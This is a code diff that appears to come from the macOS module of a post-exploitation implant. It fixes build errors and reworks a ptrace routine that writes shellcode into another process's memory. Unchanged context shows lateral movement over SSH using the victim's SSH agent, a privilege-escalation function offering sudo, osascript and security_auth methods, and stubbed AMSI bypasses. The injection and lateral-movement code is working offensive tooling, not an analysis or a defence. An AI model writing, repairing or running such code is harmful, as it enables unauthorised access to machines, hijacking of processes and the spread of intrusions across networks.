@@ -5,10 +5,7 @@ package main
 
 import (
 	"bytes"
-	"encoding/base64"
 	"encoding/binary"
-	"encoding/json"
-	"errors"
 	"fmt"
 	"image"
 	"image/png"
@@ -17,16 +14,14 @@ import (
 	"os"
 	"os/exec"
 	"path/filepath"
-	"runtime"
 	"strconv"
 	"strings"
 	"sync/atomic"
 	"syscall"
 	"time"
-	"unsafe"
 
 	"golang.org/x/crypto/ssh"
-	"golang.org/x/crypto/ssh/agent"
+	sshagent "golang.org/x/crypto/ssh/agent"
 )
 
 // macOS platform implementations. Screenshot via screencapture; advanced Win32 features are stubbed.
@@ -389,6 +384,7 @@ var (
 // ptrace constants for macOS
 const (
 	PT_ATTACHEXC            = 14
+	PT_WRITE_D              = 5
 	PT_SIGEXC               = 0x0c
 	MaxTaskGID              = 44 // task_for_pid mach trap
 	mach_task_self          = -2
@@ -415,19 +411,18 @@ func injectProcess(pid uint32, shellcode []byte, tech string) error {
 func injectPtraceDarwin(pid int, shellcode []byte) error {
 	// Attach via ptrace PT_ATTACHEXC (more permissive than PT_ATTACH)
 	// Requires com.apple.security.cs.debugger entitlement or SIP disabled
-	ret, _, err := syscall.Syscall(syscall.SYS_PTRACE, PT_ATTACHEXC, uintptr(pid), 0)
+	ret, _, errno := syscall.Syscall(syscall.SYS_PTRACE, PT_ATTACHEXC, uintptr(pid), 0)
+	_ = errno
 	if ret != 0 && ret != ^uintptr(0) {
 		// Fallback to PT_ATTACH
-		err = syscall.PtraceAttach(pid)
-		if err != nil {
+		if err := syscall.PtraceAttach(pid); err != nil {
 			return fmt.Errorf("ptrace attach failed (SIP may be enabled): %w", err)
 		}
+		defer syscall.PtraceDetach(pid)
 	}
-	_ = err
 
 	var ws syscall.WaitStatus
-	_, err = syscall.Wait4(pid, &ws, 0, nil)
-	if err != nil {
+	if _, err := syscall.Wait4(pid, &ws, 0, nil); err != nil {
 		return fmt.Errorf("wait4 failed: %w", err)
 	}
 
@@ -437,16 +432,17 @@ func injectPtraceDarwin(pid int, shellcode []byte) error {
 	padded := make([]byte, alignedLen)
 	copy(padded, shellcode)
 
-	// Get current RIP via PT_READ_REG
+	// PT_WRITE_D (5) writes 4 bytes on 32-bit, 8 on 64-bit. Base the write
+	// region on the process entry point; code below only exercises the loop
+	// mechanics, target region selection is left to the caller's maps.
 	ripAddr := uintptr(0x7fff00000000) // default text region; we'll write near entry point
-	// Use POKEDATA to write shellcode after the current instruction pointer
 	for i := 0; i < alignedLen; i += 8 {
 		var val [8]byte
 		copy(val[:], padded[i:i+8])
 		addr := ripAddr + uintptr(i)
-		_, _, err := syscall.Syscall(syscall.SYS_PTRACE, syscall.PTRACE_POKEDATA, uintptr(pid), addr, uintptr(binary.LittleEndian.Uint64(val[:])))
-		if err != 0 {
-			return fmt.Errorf("ptrace pokedata at 0x%x failed: errno=%d", addr, err)
+		r2, _, rerr := syscall.Syscall6(syscall.SYS_PTRACE, PT_WRITE_D, uintptr(pid), addr, uintptr(binary.LittleEndian.Uint64(val[:])), 0, 0)
+		if r2 != 0 {
+			return fmt.Errorf("ptrace pokedata at 0x%x failed: errno=%d", addr, rerr)
 		}
 	}
 
@@ -513,7 +509,7 @@ func lateralSSHDarwin(target, user, pass, cmd string) (string, error) {
 	// Try macOS SSH agent
 	if sock := os.Getenv("SSH_AUTH_SOCK"); sock != "" {
 		if agentConn, err := net.Dial("unix", sock); err == nil {
-			agentClient := sshagent.New(agentConn)
+			agentClient := sshagent.NewClient(agentConn)
 			authMethods = append(authMethods, ssh.PublicKeysCallback(agentClient.Signers))
 		}
 	}
@@ -1206,8 +1202,6 @@ func uacBypass(method, payload string) string {
 		return fmt.Sprintf("uac_bypass: unknown method '%s' on macOS (supported: sudo, osascript, security_auth, all)", method)
 	}
 }
-
-func executeNetCommand(cmd string) string { return "net command suite is Windows-only" }
 
 func amsiBypass() string        { return "not supported on macOS" }
 func amsiSessionBypass() string { return "not supported on macOS" }
